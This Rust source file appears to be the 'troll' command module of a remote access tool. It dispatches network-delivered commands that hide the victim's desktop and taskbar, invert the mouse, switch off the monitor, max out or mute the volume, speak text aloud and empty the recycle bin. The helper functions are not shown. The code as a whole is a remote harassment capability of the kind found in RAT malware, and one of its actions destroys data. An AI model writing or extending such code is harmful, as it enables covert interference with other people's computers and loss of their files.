pub mod desktop_fun;
pub mod audio_fun;
use common::packets::TrollCommand;

pub fn execute_troll_command(command: &TrollCommand) {
    match command {
        TrollCommand::HideDesktop(_p) => desktop_fun::toggle_desktop(false),
        TrollCommand::ShowDesktop(_p) => desktop_fun::toggle_desktop(true),
        TrollCommand::HideTaskbar(_p) => desktop_fun::toggle_taskbar(false),
        TrollCommand::ShowTaskbar(_p) => desktop_fun::toggle_taskbar(true),
        TrollCommand::HideNotify(_p) => desktop_fun::toggle_notification_area(false),
        TrollCommand::ShowNotify(_p) => desktop_fun::toggle_notification_area(true),
        TrollCommand::FocusDesktop(_p) => desktop_fun::focus_desktop(),
        TrollCommand::EmptyTrash(_p) => desktop_fun::empty_recycle_bin(),
        TrollCommand::RevertMouse(_p) => desktop_fun::toggle_invert_mouse(true),
        TrollCommand::NormalMouse(_p) => desktop_fun::toggle_invert_mouse(false),
        TrollCommand::MonitorOff(_p) => desktop_fun::toggle_monitor(false),
        TrollCommand::MonitorOn(_p) => desktop_fun::toggle_monitor(true),
        TrollCommand::MaxVolume(_p) => audio_fun::set_volume(audio_fun::Volume::Max),
        TrollCommand::MinVolume(_p) => audio_fun::set_volume(audio_fun::Volume::Min),
        TrollCommand::MuteVolume(_p) => audio_fun::toggle_volume_mute(),
        TrollCommand::UnmuteVolume(_p) => audio_fun::toggle_volume_mute(),
        TrollCommand::SpeakText(text) => audio_fun::speak_text(text),
        TrollCommand::Beep(freq_duration)=> { audio_fun::beep(freq_duration) },
        TrollCommand::PianoKey(key) => { audio_fun::piano_key(key.parse::<u32>().unwrap())},
    }
}